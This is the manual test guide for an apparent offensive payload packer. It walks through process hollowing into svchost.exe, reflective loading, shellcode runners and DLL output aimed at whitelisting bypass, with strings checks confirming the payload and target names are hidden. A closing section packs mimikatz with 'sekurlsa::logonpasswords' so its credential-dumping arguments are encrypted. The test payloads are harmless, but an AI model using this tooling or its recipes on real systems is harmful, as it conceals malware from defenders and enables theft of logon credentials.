# Manual end-to-end tests

The test payload (`test_payload.exe`) **prints** the fixed marker
`PAYLOAD_MARKER_7f3a9c2e` to stdout and exits `0`. It opens no dialog, so a run
never blocks and its output can be captured from a terminal (or by an agent).
A debug build (`build.stub.debug: true`) also makes the stub print a per-build
`STUB_MARKER_<hex>` to stderr; a delivery build prints nothing.

## Visible payload (`msgbox.exe`)

`msgbox.exe` is the interactive counterpart. It calls `MessageBoxW` with "Hello
world" and blocks until the dialog is dismissed, so it is the check to use when
you want to *see* the payload run rather than read a marker: under process
hollowing the dialog appears from `svchost.exe`, under reflective loading from
the packed stub's own process.

```powershell
powershell -ExecutionPolicy Bypass -File examples/payloads/build_msgbox.ps1
```

Its source (`msgbox.rs`) is a single `rustc` compile with no Cargo project, like
the other payloads, and links `user32.lib` for `MessageBoxW`.

Packing it needs no dedicated plan: point `build.payloads.<name>.source` at it (the
default `format: pe` applies) and build as usual.

```yaml
build:
  payload:
    source: ./examples/payloads/msgbox.exe
```

## Process hollowing

### 0. Requirements

- `rustc` on the PATH.
- Workspace dependencies already compiled: `cargo build` at the repo root.
- Process Explorer or Process Hacker (to confirm the hollowing in step 5).

### 1. Compile the test payload (if missing)

```powershell
powershell -ExecutionPolicy Bypass -File examples/payloads/build_test_payload.ps1
```

### 2. Pack

```powershell
cargo run -- build examples/plans/process-hollowing.yaml
```

This produces `dist/test_packed.exe` (and leaves intermediate artifacts in
`build/`).

### 3. Open Process Explorer / Process Hacker

Open it *before* running the packed binary so you can watch which process runs
the payload.

### 4. Run the packed binary

```powershell
.\dist\test_packed.exe
```

A debug build (`build.stub.debug: true`) shows the stub's marker on stderr,
e.g.:

```
STUB_MARKER_<hex>
```

The payload runs in the hollowed `svchost.exe`, which has **no console attached**
(the stub does not inherit handles and `svchost.exe` is a GUI-subsystem
process), so the payload's stdout is not visible from the parent. Look for the
marker in Process Explorer instead (step 5).

### 5. Confirm the hollowing (the key check)

The payload runs **inside `svchost.exe`**, not in `test_packed.exe`. In Process
Explorer, the `svchost.exe` created by the stub is the process hosting the
payload; `test_packed.exe` only waits for it.

### 6. Verify no cleartext payload on disk

The stub never writes the decrypted payload. There must be **no**
`payload_decrypted.bin` in the working directory.

### 7. Verify obfuscation (no cleartext markers)

```bash
strings dist/test_packed.exe | grep STUB_MARKER      # should print nothing
strings dist/test_packed.exe | grep PAYLOAD_MARKER   # should print nothing
strings dist/test_packed.exe | grep -i svchost        # should print nothing
```

- `PAYLOAD_MARKER` is encrypted (does not appear).
- `STUB_MARKER` and the target path (`svchost.exe`) are XOR-obfuscated, and a
  delivery build never prints the marker in the first place.

## Reflective loading

Loads the payload into the current process (no external target).

```powershell
cargo run -- build examples/plans/reflective-loading.yaml
.\dist\test_packed_reflective.exe
```

Both markers go to the same terminal, because everything runs in one process:

```
STUB_MARKER_<hex>
PAYLOAD_MARKER_7f3a9c2e
```

Verify the payload was mapped, not spawned:

```bash
strings dist/test_packed_reflective.exe | grep -i svchost   # should print nothing
strings dist/test_packed_reflective.exe | grep PAYLOAD_MARKER # should print nothing
```

## In-process shellcode runners

The three runners added for `format: shellcode` (`fibers`, `module_stomping`,
`execution_callbacks`) return control to the loader, so several can run in one
artifact. The example chains all three with the demo blob and exits `42`:

```sh
cargo run -- build examples/plans/in-process-runners.yaml
.\dist\test_in_process.exe ; echo $LASTEXITCODE
```

Each step needs its own `build.payloads` entry (pinned with `params.payload`).
Delete the steps you do not want: a single technique needs one step and one
payload. See the per-technique READMEs for what each one evades and what
detects it.

## DLL output (host-loaded)

`build.output.kind: dll` ships the same chain as a DLL a host process loads — the
mode for environments where application whitelisting only lets an interpreter
run. The artifact exports `DllMain`, `JNI_OnLoad` and `Run` (`entry: auto`), so
one file works from every host, and everything runs **in the host's process**.

```sh
cargo run -- build examples/plans/dll-shellcode.yaml   # chain returns 42
cargo run -- build examples/plans/dll.yaml             # chain opens a dialog
```

Then load it from a host — the scripts take the DLL and export as arguments:

| Host | Command | Expected |
|---|---|---|
| CPython | `python examples/hosts/ctypes_host.py` | `Run() -> 42` |
| PowerShell | `powershell -ExecutionPolicy Bypass -File examples/hosts/pinvoke_host.ps1` | `Run() -> 42` + the DLL in the host's module list |
| .NET | `dotnet run --project examples/hosts/dotnet_host -- dist/dll-shellcode.dll Run` | `Run() -> 42` |
| `rundll32` | `powershell -ExecutionPolicy Bypass -File examples/hosts/rundll32_host.ps1` | a debug build's `STUB_MARKER_<hex>` on the captured stderr (`rundll32` exits 0) |
| `rundll32` (cmd) | `examples\hosts\rundll32_host.cmd` | a debug build's marker in cmd's console — the PowerShell-free path |
| Java | `java -cp examples/hosts/java_host JavaHost dist/dll-shellcode.dll 10000` | `JNI_OnLoad` returns at once; the latch keeps the JVM alive |

The `rundll32` rows read the stub's marker, which only a debug build
(`build.stub.debug: true`) emits.

Java (compile it first with
`javac -d examples/hosts/java_host examples/hosts/java_host/FfmHost.java`),
Perl, Ruby, PHP, LuaJIT and Node scripts are in `examples/hosts/` too. The
complete catalogue — which runtime loads a DLL, with what, and which one reports
the chain's return code — is the docs page `docs/hosts.md`.

The `dll.yaml` payload is a modal dialog: it appears *from the host process*
(`python.exe`, `java.exe`, …), which is the visible proof of in-process
execution; `Run` blocks until you dismiss it and then returns 0.

The Java host has no prebuilt binary: compile it once with
`javac -d examples/hosts/java_host examples/hosts/java_host/JavaHost.java`.

`entry: auto` is convenient but conspicuous (a plain chain-runner export next to
`JNI_OnLoad`); for delivery pick `jni_on_load` or `export:<name>`. Full guide,
per-host caveats and the calling shape: `examples/hosts/README.md`.

## Payload arguments

The payload's arguments come from `build.payloads.<name>.args` (fixed, YAML) plus the
args you pass to the packed binary, combined by `build.payloads.<name>.args_mode`
(`join` = YAML first, then runtime; `override` = runtime args replace the YAML
ones). See `docs/features/ref/args.md`.

### 1. Compile the argument-printing payload

```powershell
powershell -ExecutionPolicy Bypass -File examples/payloads/build_args_payload.ps1
```

It prints its `argv` between `ARGS_BEGIN`/`ARGS_END` (and the raw
`GetCommandLineW` value between `CMDLINE_BEGIN`/`CMDLINE_END`).

### 2. Pack with `join` and run it with extra args

```powershell
cargo run -- build examples/plans/args.yaml
.\dist\test_args_join.exe "runtime-c" "runtime-d"
```

```
ARGS_BEGIN
C:\...\test_args_join.exe
 yaml-a
 yaml-b
 runtime-c
 runtime-d
ARGS_END
```

Token 0 is the executable name, not an argument: `yaml-a`/`yaml-b` come from the
YAML and `runtime-c`/`runtime-d` from the command line you typed, in that order.
Running it with no arguments yields just `yaml-a` and `yaml-b`.

### 3. `args_mode: override`

`override` drops the YAML args whenever the packed binary is given any runtime
argument; with no runtime argument the YAML args still apply. Set it in your own
plan:

```yaml
build:
  payload:
    args: ["yaml-a", "yaml-b"]
    args_mode: override
```

Packing that plan produces an exe that behaves like this:

```powershell
.\dist\my_payload.exe "runtime-c"   # payload sees only runtime-c
.\dist\my_payload.exe               # payload sees yaml-a, yaml-b
```

### 4. Mimikatz (equivalent of packing mimikatz.exe with args)

```yaml
build:
  payload:
    source: "./mimikatz.exe"
    args: ["privilege::debug", "log", "C:\\temp\\out.log"]
    args_mode: join
```

```powershell
.\dist\mimi.exe "sekurlsa::logonpasswords"
```

Mimikatz sees `privilege::debug`, `log C:\temp\out.log`, then
`sekurlsa::logonpasswords` — the YAML args first, the runtime arg last.

### 5. Verify the YAML args are not in cleartext

```bash
strings dist/test_args_join.exe | grep yaml-a        # should print nothing
strings dist/test_args_join.exe | grep -i privilege   # should print nothing
```

The YAML args go through `StringsConfig`, so they are rebuilt at runtime.
